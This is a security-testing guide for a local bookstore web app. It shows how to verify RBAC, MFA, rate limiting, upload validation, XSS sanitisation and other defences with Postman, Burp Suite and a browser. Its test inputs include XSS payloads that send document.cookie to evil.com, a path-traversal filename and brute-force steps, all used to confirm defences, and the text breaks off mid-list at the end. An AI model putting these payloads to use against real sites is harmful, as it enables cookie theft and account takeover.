# Security Features Testing Guide
## Postman / Burp Suite / Browser

> **Base URL:** `http://localhost:4000/api` (backend)
> **Frontend URL:** `http://localhost:3000`
> **Prerequisites:** Application running via `docker-compose up`

---

## Table of Contents

1. [Admin RBAC (Role Bypass Fix)](#1-admin-rbac)
2. [MFA (TOTP + Backup Codes)](#2-mfa)
3. [CAPTCHA (Cloudflare Turnstile)](#3-captcha)
4. [Rate Limiting + Account Lockout](#4-rate-limiting)
5. [Password Policy (Complexity)](#5-password-policy)
6. [Email Verification](#6-email-verification)
7. [Session Invalidation (tokenVersion)](#7-session-invalidation)
8. [Session Binding (User-Agent)](#8-session-binding)
9. [Secure Cookie Attributes](#9-secure-cookies)
10. [JWT Expiry Reduction](#10-jwt-expiry)
11. [Per-User Rate Limiting](#11-per-user-rate-limit)
12. [CORS Protection](#12-cors)
13. [File Upload Validation](#13-file-upload)
14. [SVG XSS Sanitization](#14-svg-xss)
15. [XSS / Input Sanitization](#15-xss-sanitization)
16. [OAuth ID Token Verification](#16-oauth)
17. [Audit Logging (20 Events)](#17-audit-logging)
18. [Password Reset Flow](#18-password-reset)
19. [IP Access Control + Recent Sessions](#19-ip-access)
20. [401 Interceptor / Session Expiry Redirect](#20-401-interceptor)
21. [Data Export/Import (GDPR)](#21-data-export-import)
22. [IP Normalization](#22-ip-normalization)
23. [Bonus: Full Burp Suite Walkthrough](#bonus-full-security-walkthrough-with-burp-suite)

---

## 1. Admin RBAC (Role Bypass Fix) <a name="1-admin-rbac"></a>

**What it does:** Prevents non-admin users from accessing admin-only API routes. Uses `adminMiddleware` which checks JWT payload `role` field.

**Where:** `backend/src/middlewares/admin.middleware.ts`

### Test with Postman

**Before fix test (attempt admin access as customer):**

```
POST http://localhost:4000/api/auth/login
Body (JSON):
{
  "email": "customer@test.com",
  "password": "Customer1!",
  "captchaToken": "skip"
}
→ Copy `accessToken` from response
```

```
GET http://localhost:4000/api/auth/audit-logs
Headers:
  Authorization: Bearer <customer-accessToken>
```

- **Expected (after fix):** `403 Forbidden` - `{ "success": false, "message": "Admin access required" }`
- **Expected (before fix):** `200 OK` - data leaked

### Test with Browser

1. Login as a regular user (`customer@test.com`)
2. Navigate to `http://localhost:3000/admin`
3. **Expected:** Redirected or shown "Access Denied"

### Test with Burp Suite

1. Intercept a request from a customer session
2. Modify the path to `/admin/audit-logs` or `/admin/books/new` in Repeater
3. **Expected:** `403 Forbidden`

---

## 2. MFA (TOTP + Backup Codes) <a name="2-mfa"></a>

**What it does:** Time-based One-Time Password (RFC 6238) via authenticator apps + 10 bcrypt-hashed backup codes.

**Where:** `backend/src/services/mfa.service.ts`, routes: `/api/auth/mfa/*`

### Test with Postman

**Step 1: Enable MFA**

```
POST http://localhost:4000/api/auth/mfa/setup
Headers:
  Authorization: Bearer <accessToken>
Body (JSON): {}
```

→ Returns `{ secret: "BASE32SECRET", qrCode: "data:image/png;base64,..." }`

**Step 2: Scan QR with authenticator app** (Google Authenticator, Authy)

**Step 3: Verify & Enable**

```
POST http://localhost:4000/api/auth/mfa/enable
Headers:
  Authorization: Bearer <accessToken>
Body (JSON):
{
  "secret": "BASE32SECRET",
  "totpCode": "123456"
}
```

→ If code from app matches → `{ success: true, data: { backupCodes: [...] } }`
→ If wrong code → `{ success: false, message: "Invalid verification code" }`

**Step 4: Login with MFA**

```
POST http://localhost:4000/api/auth/login
Body (JSON):
{
  "email": "user@test.com",
  "password": "MyPassword1!",
  "captchaToken": "skip"
}
```

→ Returns: `{ success: true, message: "MFA verification required", data: { mfaRequired: true, mfaToken: "jwt..." } }`

**Step 5: Complete MFA verification**

```
POST http://localhost:4000/api/auth/mfa/verify-login
Body (JSON):
{
  "mfaToken": "<mfaToken from step 4>",
  "totpCode": "123456"
}
```

→ Returns `{ success: true, data: { accessToken: "...", user: {...} } }`

**Step 6: Use backup code instead**

Same as Step 5, but use one of the 10-character backup codes instead of the 6-digit TOTP:

```
POST http://localhost:4000/api/auth/mfa/verify-login
Body (JSON):
{
  "mfaToken": "<mfaToken>",
  "totpCode": "a1b2c3d4e5"
}
```

→ After use, that backup code is consumed (marked `usedAt` in DB).

**Step 7: MFA brute-force test**

Rapidly send 10+ wrong TOTP codes within 15 minutes:

```
POST http://localhost:4000/api/auth/mfa/verify-login
Body (JSON):
{
  "mfaToken": "<mfaToken>",
  "totpCode": "000000"
}
```

**Expected after 10 attempts:** `429 Too Many Requests` - rate limited.

**Step 8: Disable MFA**

```
POST http://localhost:4000/api/auth/mfa/disable
Headers:
  Authorization: Bearer <accessToken>
Body (JSON):
{
  "totpCode": "123456"
}
```

### Test with Browser

Navigate to `http://localhost:3000/mfa/settings` → Walk through setup UI flow.

### Test with Burp Suite (Intruder)

1. Capture a `POST /api/auth/mfa/verify-login` request with `totpCode` parameter
2. Send to Intruder
3. Set payload position on `totpCode` value
4. Add payloads: all numbers from 000000 to 000020 (just 20 guesses)
5. **Expected:** After ~10 attempts → `429 Too Many Requests`

---

## 3. CAPTCHA (Cloudflare Turnstile) <a name="3-captcha"></a>

**What it does:** Cloudflare Turnstile (privacy-preserving CAPTCHA) on login and registration endpoints.

**Where:** `backend/src/middlewares/captcha.middleware.ts`

### Test with Postman

**Without CAPTCHA token:**

```
POST http://localhost:4000/api/auth/login
Body (JSON):
{
  "email": "test@test.com",
  "password": "Test1234!"
}
```

- **Expected:** `400 Bad Request` - `{ "success": false, "message": "CAPTCHA token is required" }`

**With fake CAPTCHA token (in dev mode):**

Since in development mode CAPTCHA is skipped if `TURNSTILE_SECRET_KEY` is not set, you can use any value:

```
POST http://localhost:4000/api/auth/login
Body (JSON):
{
  "email": "test@test.com",
  "password": "Test1234!",
  "captchaToken": "skip"
}
```

### Test with Browser

1. Go to `http://localhost:3000/login`
2. Clear the CAPTCHA widget (if visible)
3. Submit the form → **Expected:** Form submission blocked, "CAPTCHA verification failed" error
4. Complete the Turnstile widget → Submit → Should proceed

### Test with Burp Suite (Repeater)

1. Start a login request in Repeater
2. Delete the `captchaToken` field from the body
3. Send → **Expected:** `400 Bad Request`

---

## 4. Rate Limiting + Account Lockout <a name="4-rate-limiting"></a>

**What it does:** Two layers of brute-force protection:
- **express-rate-limit** on network layer (IP-based): 20 req/15min on login, 10 on register, 5 on forgot-password
- **Account lockout** at application layer: 15 failed attempts → 30-minute lockout

**Where:** `backend/src/routes/auth.routes.ts`, `backend/src/services/auth.service.ts`

### Test with Postman

**Layer 1 - Network rate limit (login endpoint):**

Rapidly send 21+ login requests within 15 minutes:

```bash
# Using bash loop:
for i in $(seq 1 21); do
  curl -s -o /dev/null -w "%{http_code}\n" -X POST http://localhost:4000/api/auth/login \
    -H "Content-Type: application/json" \
    -d '{"email":"test@test.com","password":"WrongPass1!","captchaToken":"skip"}'
done
```

- **Expected #1-20:** `401 Unauthorized` (wrong password)
- **Expected #21:** `429 Too Many Requests` - `{ "success": false, "message": "Too many login attempts from this IP..." }`

**Layer 2 - Account lockout:**

Send 15 wrong password attempts for the SAME account:

```
POST http://localhost:4000/api/auth/login
Body: {"email":"target@test.com","password":"WrongPass1!","captchaToken":"skip"}
```

- **After 15 attempts:** Response changes - `{ "success": false, "message": "Account locked due to too many failed attempts. Try again after 30 minutes." }`

### Test with Browser

1. Go to `http://localhost:3000/login`
2. Submit wrong password repeatedly (15+ times)
3. **Expected:** After ~15 attempts → "Account locked. Try again in 30 minutes."

### Test with Burp Suite (Intruder)

1. Capture `POST /api/auth/login` request
2. Send to Intruder
3. Configure payload: vary password value across 25 iterations
4. Run attack
5. **Expected:** After ~15 attempts → account lockout message. After ~20 attempts → rate limit (429) on IP

---

## 5. Password Policy (Complexity) <a name="5-password-policy"></a>

**What it does:** Zod `superRefine` enforces: 8+ chars, uppercase, lowercase, digit, special character. Frontend also has animated strength meter.

**Where:** `backend/src/dto/auth.dto.ts`

### Test with Postman

**Too short:**
```
POST http://localhost:4000/api/auth/register
Body: {"name":"Test","email":"t@t.com","password":"Ab1!","captchaToken":"skip"}
```
→ **Expected:** `400` - "Password must be at least 8 characters"

**Missing uppercase:**
```
POST http://localhost:4000/api/auth/register
Body: {"name":"Test","email":"t@t.com","password":"abcdef1!@","captchaToken":"skip"}
```
→ **Expected:** `400` - "Must contain at least one uppercase letter"

**Missing lowercase:**
```
POST http://localhost:4000/api/auth/register
Body: {"name":"Test","email":"t@t.com","password":"ABCDEF1!@","captchaToken":"skip"}
```
→ **Expected:** `400` - "Must contain at least one lowercase letter"

**Missing digit:**
```
POST http://localhost:4000/api/auth/register
Body: {"name":"Test","email":"t@t.com","password":"Abcdef!!@","captchaToken":"skip"}
```
→ **Expected:** `400` - "Must contain at least one number"

**Missing special char:**
```
POST http://localhost:4000/api/auth/register
Body: {"name":"Test","email":"t@t.com","password":"Abcdef12","captchaToken":"skip"}
```
→ **Expected:** `400` - "Must contain at least one special character"

**Valid password:**
```
POST http://localhost:4000/api/auth/register
Body: {"name":"Test","email":"t@t.com","password":"ValidPass1!","captchaToken":"skip"}
```
→ **Expected:** `201 Created` - registration proceeds

### Test with Browser

1. Go to `http://localhost:3000/signup`
2. Type a weak password → Watch password strength meter update in real-time
3. Try submitting with a weak password → Should see inline validation errors

---

## 6. Email Verification <a name="6-email-verification"></a>

**What it does:** Token-based email verification. Registration returns a message (not tokens). Users must verify email before logging in. Google OAuth auto-verifies.

**Where:** `backend/src/services/auth.service.ts`

### Test with Postman

**Register a new user:**

```
POST http://localhost:4000/api/auth/register
Body: {"name":"New User","email":"newuser@test.com","password":"ValidPass1!","captchaToken":"skip"}
```

→ **Expected:** `201 Created` - `{ "success": true, "message": "Registration successful. Please check your email to verify your account." }`

Note: No `accessToken` is returned - user cannot login yet!

**Try to login before verification:**

```
POST http://localhost:4000/api/auth/login
Body: {"email":"newuser@test.com","password":"ValidPass1!","captchaToken":"skip"}
```

→ **Expected:** `401` - "Please verify your email before logging in"

**Verify email** (you'll need to check the backend logs for the verification token):

```
GET http://localhost:4000/api/auth/verify-email?token=<token-from-log>
```

→ **Expected:** `200` - "Email verified successfully"

**Now login works:**

```
POST http://localhost:4000/api/auth/login
Body: {"email":"newuser@test.com","password":"ValidPass1!","captchaToken":"skip"}
```

→ **Expected:** `200` - Login successful with `accessToken`

**Resend verification (rate limited):**

```
POST http://localhost:4000/api/auth/resend-verification
Body: {"email":"newuser@test.com"}
```

→ **Expected:** `200` - verification re-sent

Hit it 6 times → **Expected:** `429 Too Many Requests`

---

## 7. Session Invalidation (tokenVersion) <a name="7-session-invalidation"></a>

**What it does:** Every JWT contains a `tokenVersion` field. On password change, `tokenVersion` is incremented in DB, instantly invalidating ALL existing sessions.

**Where:** `backend/src/middlewares/auth.middleware.ts`, `backend/src/services/auth.service.ts`

### Test with Postman

**Step 1: Login and capture tokens**

```
POST http://localhost:4000/api/auth/login
Body: {"email":"user@test.com","password":"OldPass1!","captchaToken":"skip"}
```
→ Copy both `accessToken`s (from browser and API)

**Step 2: Verify current token works**

```
GET http://localhost:4000/api/auth/me
Headers: Authorization: Bearer <accessToken>
```
→ **Expected:** `200 OK` - profile returned

**Step 3: Change password (increments tokenVersion)**

```
POST http://localhost:4000/api/auth/reset-password
Body: {"token":"<reset-token>","password":"NewValidPass1!"}
```
or via profile update that changes password.

**Step 4: Try old token again**

```
GET http://localhost:4000/api/auth/me
Headers: Authorization: Bearer <old-accessToken>
```
→ **Expected:** `401 Unauthorized` - "Session expired. Please sign in again."

### Test with Browser

1. Login in two different browser tabs/windows
2. Go to Profile → Change password
3. Go to the other tab and try to navigate to a protected page (e.g., `/profile`)
4. **Expected:** Redirected to `/login?expired=true`

---

## 8. Session Binding (User-Agent) <a name="8-session-binding"></a>

**What it does:** JWT contains SHA-256 hash of the User-Agent header. If a token is stolen and used from a different browser/device, the User-Agent hash won't match.

**Where:** `backend/src/middlewares/auth.middleware.ts`, `backend/src/controllers/auth.controller.ts`

### Test with Postman

**Step 1: Login with a realistic User-Agent header**

```
POST http://localhost:4000/api/auth/login
Headers:
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
  Content-Type: application/json
Body: {"email":"user@test.com","password":"ValidPass1!","captchaToken":"skip"}
```
→ Copy `accessToken`

**Step 2: Use the same token with a DIFFERENT User-Agent**

```
GET http://localhost:4000/api/auth/me
Headers:
  Authorization: Bearer <accessToken>
  User-Agent: curl/8.0.0
```
→ **Expected:** `401` - "Session invalid: device or browser mismatch. Please sign in again."

**Step 3: Use the same token with the ORIGINAL User-Agent**

```
GET http://localhost:4000/api/auth/me
Headers:
  Authorization: Bearer <accessToken>
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
```
→ **Expected:** `200 OK` - works normally

### Test with Burp Suite

1. Login via browser and capture a valid session token
2. In Repeater, change the `User-Agent` header to a different browser string
3. Send the request → **Expected:** `401 Session invalid`

---

## 9. Secure Cookie Attributes <a name="9-secure-cookies"></a>

**What it does:** NextAuth session cookies are configured with `HttpOnly`, `SameSite=Lax`, `Secure` (in production), and `__Secure-` prefix.

**Where:** `frontend/src/auth.ts`

### Test with Browser

1. Login at `http://localhost:3000/login`
2. Open DevTools → Application → Cookies
3. Verify the session cookie:
   - `httpOnly: true` (cannot be accessed by JavaScript)
   - `sameSite: Lax` (sent for top-level navigations)
   - In production: `Secure: true` + `__Secure-` prefix

### Test with Burp Suite

1. Login and intercept the response
2. Check `Set-Cookie` headers:
   - `HttpOnly` flag present
   - `SameSite=Lax`
   - `Path=/`
   - In production: `Secure` flag and `__Secure-` prefix

### Manual XSS Test

In browser console (on login page):
```javascript
document.cookie
```
→ **Expected:** No session token visible (because `HttpOnly`)

---

## 10. JWT Expiry Reduction <a name="10-jwt-expiry"></a>

**What it does:** Default JWT expiry reduced to 60 minutes (configurable via `JWT_EXPIRES_IN` env var).

**Where:** `backend/src/utils/jwt.ts`

### Test with Postman

**Step 1: Login and get token**

```
POST http://localhost:4000/api/auth/login
Body: {"email":"user@test.com","password":"ValidPass1!","captchaToken":"skip"}
```

**Step 2: Decode the JWT**

Copy the token and decode it at https://jwt.io or in terminal:
```bash
echo "<token>" | cut -d. -f2 | base64 -d 2>/dev/null
```

→ Check the `exp` claim. It should be ~60 minutes from `iat`.

**Step 3: Wait 60+ minutes (or set JWT_EXPIRES_IN=1m for testing)**

→ **Expected:** After expiry → `401 Invalid or expired token`

### Quick expire test

In `.env`, set:
```
JWT_EXPIRES_IN=10s
```

Restart and login. Wait 10 seconds, then:

```
GET http://localhost:4000/api/auth/me
Headers: Authorization: Bearer <token>
```
→ After 10s: `401 Invalid or expired token`

---

## 11. Per-User Rate Limiting <a name="11-per-user-rate-limit"></a>

**What it does:** Separate rate limits per authenticated user on: Cart (60/15min), Wishlist (60/15min), Book admin (30/15min), Reviews (20/15min).

**Where:** `backend/src/middlewares/rateLimiter.middleware.ts`

### Test with Postman

**Cart endpoint rate limit:**

```bash
for i in $(seq 1 65); do
  curl -s -o /dev/null -w "%{http_code}\n" -X GET http://localhost:4000/api/cart \
    -H "Authorization: Bearer <accessToken>"
done
```

- **Expected #1-60:** `200 OK`
- **Expected #61+:** `429 Too Many Requests`

**Check the key is per-user (not per-IP):**

1. Generate a second user's token
2. Send requests with User B's token
3. **Expected:** User B is NOT rate limited (different key)

### Test with Browser

1. Login and rapidly add items to cart
2. After ~60 operations within 15 minutes → Cart operations should be blocked

---

## 12. CORS Protection <a name="12-cors"></a>

**What it does:** Explicit origin whitelist instead of wildcard `*`. Only the frontend origin is allowed.

**Where:** `backend/src/server.ts` (look for `cors()` configuration)

### Test with Postman

**With correct origin:**

```
GET http://localhost:4000/api/books
Headers:
  Origin: http://localhost:3000
```

→ **Expected:** Response includes `Access-Control-Allow-Origin: http://localhost:3000`

**With malicious origin:**

```
GET http://localhost:4000/api/books
Headers:
  Origin: https://evil.com
```

→ **Expected:** Response does NOT include `Access-Control-Allow-Origin` header

### Test with Browser (manual)

In browser console:
```javascript
fetch('http://localhost:4000/api/books', {
  credentials: 'include',
  headers: { 'Origin': 'https://evil.com' }
}).then(r => console.log(r.status));
```

Expected: CORS error in console if origin not whitelisted.

---

## 13. File Upload Validation <a name="13-file-upload"></a>

**What it does:** Multer middleware validates: 5MB max file size, MIME type whitelist (JPEG, PNG, WebP, GIF, AVIF, SVG), extension whitelist (defense-in-depth).

**Where:** `backend/src/routes/upload.routes.ts`

### Test with Postman

**Valid upload:**

```
POST http://localhost:4000/api/upload
Headers:
  Authorization: Bearer <accessToken>
Body: form-data
  Key: image → File: test.jpg (select a real JPEG < 5MB)
```

→ **Expected:** `200 OK` - `{ data: { url: "...", filename: "..." } }`

**File too large:**

Create a dummy file > 5MB:
```
dd if=/dev/zero of=large.jpg bs=1M count=6
```

```
POST http://localhost:4000/api/upload
Headers:
  Authorization: Bearer <accessToken>
Body: form-data
  Key: image → File: large.jpg
```

→ **Expected:** `413` - "File too large. Maximum size is 5 MB."

**Wrong MIME type:**

Rename a `.exe` to `.jpg`:

```
POST http://localhost:4000/api/upload
Body: form-data
  Key: image → File: fake.jpg (but actually an exe)
```

→ **Expected:** `400` - "Unsupported file type: application/x-msdownload"

**Wrong extension:**

```
POST http://localhost:4000/api/upload
Body: form-data
  Key: image → File: image.html (with Content-Type: image/png)
```

→ **Expected:** `400` - "Unsupported file extension: .html"

**Path traversal via filename:**

```bash
POST http://localhost:4000/api/upload
Body: form-data
  Key: image → File with name: ../../../etc/passwd.svg
```

→ **Expected:** `200 OK` — The saved file has a safe auto-generated name, NOT the malicious path. The original filename is ignored entirely.

**Verify filename generation (code audit):**

In `backend/src/controllers/upload.controller.ts`, the multer `filename` callback:

```javascript
filename: (_req, file, cb) => {
  const ext = path.extname(file.originalname);  // Only the extension
  const name = `${Date.now()}-${Math.random().toString(36).slice(2, 8)}${ext}`;  // Fully server-generated
  cb(null, name);
}
```

The filename is 100% server-generated — `Date.now()` + random alphanumeric + extension. No user-supplied string is used in the filename. This prevents:
- ✅ Path traversal (`../../../etc/passwd`)
- ✅ Double extension attacks (`malware.jpg.php`)
- ✅ Special characters / encoding tricks

### Test with Burp Suite

1. Intercept a file upload request
2. In Repeater, modify the filename to `../../../etc/passwd.svg`
3. Change Content-Type to `text/html`
4. Send → **Expected:** File saved with safe auto-generated name (check response JSON)

---

## 14. SVG XSS Sanitization <a name="14-svg-xss"></a>

**What it does:** SVG uploads are sanitized: `<script>` tags + `on*` event handler attributes + `javascript:` URLs removed.

**Where:** `backend/src/controllers/upload.controller.ts`

### Test with Postman

**Create a malicious SVG:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <rect width="100" height="100" fill="red" onclick="alert('XSS')"/>
  <script>alert(document.cookie)</script>
  <text x="10" y="50" onmouseover="fetch('https://evil.com/steal?cookie='+document.cookie)">Hover me</text>
  <a xlink:href="javascript:alert('XSS')">Click me</a>
</svg>
```

Save as `evil.svg` and upload:

```
POST http://localhost:4000/api/upload
Headers:
  Authorization: Bearer <adminAccessToken>
Body: form-data
  Key: image → File: evil.svg
```

**Verify sanitization:**
1. Note the returned filename
2. Fetch the file: `GET http://localhost:4000/uploads/<filename>`
3. Check the SVG content:
   - No `<script>` tags
   - No `onclick`, `onmouseover`, etc. attributes
   - No `javascript:` URLs in `href`/`xlink:href`

### Test with Browser

1. Upload an SVG with embedded JavaScript
2. View the uploaded SVG directly in browser
3. **Expected:** No script execution, no alerts

---

## 15. XSS / Input Sanitization (User-Generated Content) <a name="15-xss-sanitization"></a>

**What it does:** User-generated content (review comments, profile names, book descriptions) is rendered safely using React's default JSX text interpolation, which automatically escapes HTML entities. The project does NOT use `dangerouslySetInnerHTML` anywhere. Zod validation strips unknown fields, and Prisma parameterized queries prevent injection.

**Where:**
- `frontend/src/app/books/[id]/page.tsx` — review comment rendered as `{review.comment}` (escaped by React)
- `frontend/src/app/books/[id]/page.tsx` — `{review.user.name}` (escaped by React)
- `frontend/src/app/books/[id]/components/ReviewModal.tsx` — review form (controlled inputs, React-safe)
- `backend/src/controllers/upload.controller.ts` — SVG sanitization for uploaded images
- `backend/src/app.ts` — Helmet headers (X-Content-Type-Options, X-Frame-Options, HSTS)

### Test with Browser

**Review comment XSS test:**

1. Login and navigate to any book page
2. Write a review with this as the comment:
   ```
   <script>alert(document.cookie)</script>
   ```
3. Submit the review
4. View the review on the book page
5. **Expected:** The script tag is displayed as **plain text** — NOT executed. You should see the literal `<script>` text.

**User name XSS test:**

1. Go to Profile and update your name to: `<img src=x onerror=alert(1)>`
2. Navigate to any page displaying your name (reviews, orders, profile)
3. **Expected:** Name rendered as literal text, no script execution

**Verify no dangerouslySetInnerHTML exists:**

```bash
grep -r "dangerouslySetInnerHTML" frontend/src/ --include="*.tsx" --include="*.ts"
```

→ **Expected:** Zero matches

### Test with Burp Suite (Repeater)

1. Intercept a review submission (`POST /api/reviews`)
2. Replace the `comment` field value with:
   ```
   <img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
   ```
3. Forward the request
4. View the review on the book page
5. **Expected:** The raw HTML string is displayed as visible text, never interpreted by the browser

---

## 16. OAuth ID Token Verification <a name="16-oauth"></a>

**What it does:** Server-side Google OAuth verifies the ID token using `google-auth-library`'s `verifyIdToken()`. Only accepts tokens with correct `audience` (client ID) and `issuer` (`accounts.google.com`).

**Where:** `backend/src/services/auth.service.ts` (`loginWithGoogle` method)

### Test with Postman

**Fake ID token:**

```
POST http://localhost:4000/api/auth/oauth/google
Body (JSON):
{
  "name": "Hacker",
  "email": "victim@gmail.com",
  "idToken": "fake.jwt.token"
}
```

→ **Expected:** `401 Unauthorized` - token verification fails

**Missing ID token:**

```
POST http://localhost:4000/api/auth/oauth/google
Body (JSON):
{
  "name": "Test User",
  "email": "test@gmail.com"
}
```

→ **Expected:** `400` - Validation fails (idToken is required)

### Test with Browser (via NextAuth)

1. Set up Google OAuth credentials in `.env`
2. Login with Google
3. **Expected:** Successful login
4. Check audit logs → `google_oauth_success` event logged

---

## 17. Audit Logging (20 Events) <a name="17-audit-logging"></a>

**What it does:** 20+ event types logged via `AuditService`. Admin can view/search/filter at `/admin/audit-logs`.

**Where:** `backend/src/services/audit.service.ts`

### Test with Postman

**Login triggers audit events:**

```
POST http://localhost:4000/api/auth/login
Body: {"email":"user@test.com","password":"WrongPass1!","captchaToken":"skip"}
```
→ `login_failed` event logged

```
POST http://localhost:4000/api/auth/login
Body: {"email":"user@test.com","password":"ValidPass1!","captchaToken":"skip"}
```
→ `login_success` event logged

**View audit logs (admin only):**

```
GET http://localhost:4000/api/auth/audit-logs?page=1&limit=50
Headers:
  Authorization: Bearer <adminAccessToken>
```

→ **Expected:** `200` - array of audit log entries with `event`, `email`, `ip`, `userAgent`, `createdAt`

**Test all event types by performing these actions:**

| Action | Expected Event |
|--------|---------------|
| Register new user | `register` + `email_verification_sent` |
| Login success | `login_success` |
| Login fail | `login_failed` |
| 15x wrong password | `login_account_locked` |
| Google OAuth | `google_oauth_success` |
| MFA challenge | `mfa_challenge_issued` |
| MFA verify success | `mfa_verify_success` |
| MFA verify fail | `mfa_verify_failed` |
| Enable MFA | `mfa_enabled` |
| Disable MFA | `mfa_disabled` |
| Regenerate backup codes | `mfa_backup_codes_regenerated` |
| Forgot password request | `forgot_password_requested` |
| Reset password success | `password_reset_success` |
| Verify email | `email_verified` |

### Test with Browser

Navigate to `http://localhost:3000/admin/audit-logs` → Filter by event type, date range, search by email/IP

---

## 18. Password Reset Flow <a name="18-password-reset"></a>

**What it does:** Email-based reset with token, time-limited, email enumeration protection (always returns 200).

**Where:** `backend/src/services/auth.service.ts`

### Test with Postman

**Forgot Password (valid email):**

```
POST http://localhost:4000/api/auth/forgot-password
Body: {"email":"user@test.com"}
```

→ **Expected:** `200 OK` - Always returns success (even if email doesn't exist - prevents enumeration)

**Forgot Password (invalid email):**

```
POST http://localhost:4000/api/auth/forgot-password
Body: {"email":"nonexistent@test.com"}
```

→ **Expected:** `200 OK` - Same response! Attacker CANNOT tell if email exists.

**Reset Password (from backend logs, get the token):**

```
POST http://localhost:4000/api/auth/reset-password
Body: {"token":"<reset-token>","password":"NewValidPass1!"}
```

→ **Expected:** `200` - Password reset successfully

**Expired/wrong token:**

```
POST http://localhost:4000/api/auth/reset-password
Body: {"token":"invalid-token","password":"NewPass123!"}
```

→ **Expected:** `400` - Invalid or expired reset token

**Rate limit test:**

Send 6 forgot-password requests:

```bash
for i in $(seq 1 6); do
  curl -s -o /dev/null -w "%{http_code}\n" -X POST http://localhost:4000/api/auth/forgot-password \
    -H "Content-Type: application/json" \
    -d '{"email":"user@test.com"}'
done
```

- **Expected #6:** `429 Too Many Requests`

---

## 19. IP Access Control (Allow/Block List) <a name="19-ip-access"></a>

**What it does:** Admin can add IP allow/block rules. Blocked IPs get `403`. Allowed IPs bypass rate limiting. CIDR notation supported.

**Where:** `backend/src/middlewares/ipAccess.middleware.ts`

### Test with Postman

**Block your IP (requires admin API or direct DB insert):**

First, use the admin IP rules API:

```
POST http://localhost:4000/api/admin/ip-rules
Headers:
  Authorization: Bearer <adminAccessToken>
Body (JSON):
{
  "ip": "127.0.0.1",
  "type": "BLOCK",
  "reason": "Testing"
}
```

Then try any request:

```
GET http://localhost:4000/api/books
```

→ **Expected:** `403 Forbidden` - "Access denied. Your IP address has been blocked."

**Remove the block:**

```
POST http://localhost:4000/api/admin/ip-rules
Headers:
  Authorization: Bearer <adminAccessToken>
Body (JSON):
{
  "ip": "127.0.0.1",
  "type": "ALLOW"
}
```

→ Requests work again and bypass rate limiting.

### Test with Browser

Admin can manage rules at `http://localhost:3000/admin/ip-access`

### Recent Sessions Page (One-Click Allow/Block)

A **Sessions** page is available at `/admin/sessions` with a live feed of recent device connections from audit logs:

1. Navigate to `http://localhost:3000/admin/sessions`
2. **Expected:** Table showing connected devices with:
   - Device icon (desktop/mobile) and browser/OS info (parsed from User-Agent)
   - IP address (normalized — `::ffff:` prefix stripped)
   - User email (if authenticated)
   - Event count badge (number of audit events from that IP)
   - Relative timestamp (e.g., "2 min ago")
   - One-click **Allow** / **Block** buttons

**Test one-click rule creation:**

1. Find any IP in the sessions table
2. Click the **Allow** button
3. **Expected:** Button shows loading spinner, then toast: `🛡️ ALLOW rule created for 172.18.0.1`
4. Navigate to `/admin/ip-access` → The new rule appears with label `"Allow via Sessions — 172.18.0.1"`
5. Requests from that IP now bypass rate limiting

**Test block then verify:**

1. Click the **Block** button for the same IP
2. **Expected:** Toast: `🚫 BLOCK rule created for ...`
3. Make a request from that IP → **Expected:** `403 Forbidden` — "Access denied."

**Search/filter test:**

1. Type an IP address in the search box on the sessions page
2. **Expected:** Table filters in real-time, showing only matching sessions
3. Clear search → All sessions reappear

---

## 20. 401 Interceptor / Session Expiry Redirect <a name="20-401-interceptor"></a>

**What it does:** Frontend axios interceptor catches 401 responses and redirects to `/login?expired=true`. NextAuth middleware also catches expired tokens and redirects.

**Where:** `frontend/src/lib/api-client.ts`, `frontend/src/auth.ts`

### Test with Browser

**Method 1: Wait for token expiry**

1. Login at `http://localhost:3000/login`
2. Wait 60+ minutes (or set JWT_EXPIRES_IN very short)
3. Click on any protected page link (e.g., `/cart`, `/profile`)
4. **Expected:** Redirected to `/login?expired=true`

**Method 2: Manually corrupt token**

1. Login and open DevTools
2. Go to Application → Local Storage → find `next-auth.session-token` or similar
3. Modify the token value (add a random character)
4. Navigate to `/cart`
5. **Expected:** Redirected to `/login?expired=true` with "Your session has expired" message

---

## 21. Data Export/Import (GDPR) <a name="21-data-export-import"></a>

**What it does:** Users can export their data (JSON or CSV) and import it back. Useful for GDPR data portability.

**Where:** `backend/src/controllers/auth.controller.ts`

### Test with Postman

**Export as JSON:**

```
GET http://localhost:4000/api/auth/export?format=json
Headers:
  Authorization: Bearer <accessToken>
```

→ **Expected:** `200` - JSON file download with user profile, addresses, orders, reviews

**Export as CSV:**

```
GET http://localhost:4000/api/auth/export?format=csv
Headers:
  Authorization: Bearer <accessToken>
```

→ **Expected:** `200` - CSV file download

**Unauthenticated export:**

```
GET http://localhost:4000/api/auth/export
```

→ **Expected:** `401 Unauthorized`

---

## 22. IP Normalization (::ffff: Prefix Stripping) <a name="22-ip-normalization"></a>

**What it does:** IPv4-mapped IPv6 addresses (e.g., `::ffff:172.18.0.1`) are normalized by stripping the `::ffff:` prefix at the source — in the backend's API controllers — so every frontend page and component receives clean IPs automatically.

**Where:** `backend/src/controllers/admin.controller.ts` (`normalizeIp` helper, used in `getRecentSessions` and `getDashboard`)

### Test with Browser

1. Access the application behind Docker (or any IPv6-enabled proxy)
2. Navigate to `/admin/ip-access`
3. Check any IP addresses displayed in the rules table
4. **Expected:** IPs show as `172.18.0.1`, NOT `::ffff:172.18.0.1`

5. Navigate to `/admin/sessions`
6. **Expected:** All session IPs are clean (no `::ffff:` prefix)

7. Navigate to `/admin` (dashboard)
8. Check the recent activity feed for IP addresses
9. **Expected:** All IPs are clean

### Test with Postman

Query the sessions endpoint:

```
GET http://localhost:4000/api/admin/ip-rules/sessions
Headers:
  Authorization: Bearer <adminAccessToken>
```

→ **Expected:** All `ip` fields in the response have `::ffff:` stripped — e.g., `"ip": "172.18.0.1"` not `"ip": "::ffff:172.18.0.1"`

### Why it matters

- **Consistency:** Every frontend page (IP rules table, sessions page, dashboard activity) shows clean IPs without each page needing its own normalization logic
- **Session grouping:** `::ffff:172.18.0.1` and `172.18.0.1` from the same device are properly merged into one session
- **Rule matching:** When creating allow/block rules via one-click buttons, the normalized IP matches the backend middleware's own normalization exactly

---

## Bonus: Full Security Walkthrough with Burp Suite

### Automated Scan (Passive)

1. Configure Burp Suite proxy (`127.0.0.1:8080`)
2. Set browser to use Burp proxy
3. Navigate through the entire app:
   - Register account
